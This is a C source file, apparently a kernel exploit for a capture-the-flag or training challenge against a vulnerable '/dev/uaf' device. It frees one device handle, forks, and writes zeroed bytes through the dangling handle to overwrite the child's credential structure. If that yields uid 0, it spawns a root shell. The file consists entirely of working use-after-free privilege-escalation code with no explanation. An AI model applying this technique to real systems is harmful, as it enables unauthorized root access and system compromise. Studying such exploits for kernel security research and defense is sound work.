// gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

int main() {
    int fd1 = open("/dev/uaf", O_RDWR);
    int fd2 = open("/dev/uaf", O_RDWR);

    close(fd1);

    int pid = fork();

    if(pid < 0) {
        printf("ERROR");
        exit(-1);
    }
    else if(pid == 0) {
        char fake_cred[30] = {0, };

        write(fd2, fake_cred, 28);

        usleep(10);

        if(getuid() == 0) {
            system("/bin/sh");
            exit(0);
        }
    }
    else {
        wait(0);
    }

    return 0;
}
